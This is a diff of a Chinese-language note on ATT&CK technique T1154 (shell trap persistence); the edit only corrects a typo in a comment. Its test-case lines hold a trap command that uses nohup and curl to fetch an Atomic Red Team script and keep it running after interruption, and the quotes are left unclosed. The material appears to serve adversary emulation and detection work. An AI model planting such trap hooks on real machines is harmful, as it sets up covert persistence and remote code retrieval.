@@ -6,7 +6,7 @@
 
 ## 测试案例
 
-trap 'nohup curl -sS https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1154/echo-art-fish.sh # 脚本即使在退出后（ctrl + c）也会即系执行程序/脚本。
+trap 'nohup curl -sS https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1154/echo-art-fish.sh # 脚本即使在退出后（ctrl + c）也会继续执行程序/脚本。
 
 trap 'nohup curl -sS https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1154/echo-art-fish.sh 
 
